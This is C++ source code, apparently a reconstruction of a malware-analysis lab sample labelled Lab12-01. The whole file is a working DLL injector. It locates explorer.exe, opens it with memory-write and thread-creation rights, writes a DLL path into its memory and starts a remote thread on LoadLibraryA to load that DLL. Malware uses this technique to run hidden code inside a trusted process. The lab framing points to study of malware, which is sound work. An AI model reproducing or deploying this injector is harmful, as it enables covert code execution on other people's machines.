#include "Lab12-01.h"

int main(void)
{
	CHAR dllPath[MAX_PATH];
	DWORD pids[1024] = { 0 };
	DWORD cbNeeded = 0;
	DWORD processCount = 0;
	BOOL isExplorerProc = FALSE;
	HANDLE hTargetProc = nullptr;
	LPVOID remoteAddr = nullptr;
	HMODULE hModule = nullptr;
	
	GetCurrentDirectoryA(MAX_PATH, dllPath);
	lstrcatA(dllPath, "\\Lab12-01.dll");

	if (!ptr_EnumProcesses(pids, sizeof(pids), &cbNeeded))
		return 1;
	processCount = cbNeeded / sizeof(DWORD);

	for (int i = 0; i < processCount; ++i)
	{
		if (pids[i])
			isExplorerProc = _IsExplorerProc(pids[i]);
		if (isExplorerProc)
		{
			hTargetProc = OpenProcess(
				(PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION),
				FALSE,
				pids[i]
			);
			if (!hTargetProc)
				return 2;
			i = 2000;
		}
	}

	remoteAddr = VirtualAllocEx(hTargetProc, nullptr, strlen(dllPath) + 1, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (!remoteAddr)
		return 3;

	WriteProcessMemory(hTargetProc, remoteAddr, dllPath, MAX_PATH, 0);
	hModule = GetModuleHandleA("kernel32.dll");
	auto ptr_LoadLibraryA = reinterpret_cast<HMODULE (WINAPI*)(LPCSTR)>(GetProcAddress(hModule, "LoadLibraryA"));
	
	if (CreateRemoteThread(hTargetProc, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(ptr_LoadLibraryA), remoteAddr, 0, 0))
		return 0;

	return -1;
}


BOOL _IsExplorerProc(DWORD pid)
{
	HANDLE hProc = nullptr;
	HMODULE hMod = nullptr;
	DWORD cbNeeded = 0;
	char processName[MAX_PATH] = "<unknown>";

	hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (!hProc)
		return FALSE;

	if (ptr_EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbNeeded))
		ptr_GetModuleBaseNameA(hProc, hMod, processName, sizeof(processName) / sizeof(char));

	if (!_strnicmp(processName, "explorer.exe", 13))
		return TRUE;

	CloseHandle(hProc);
	return FALSE;
}
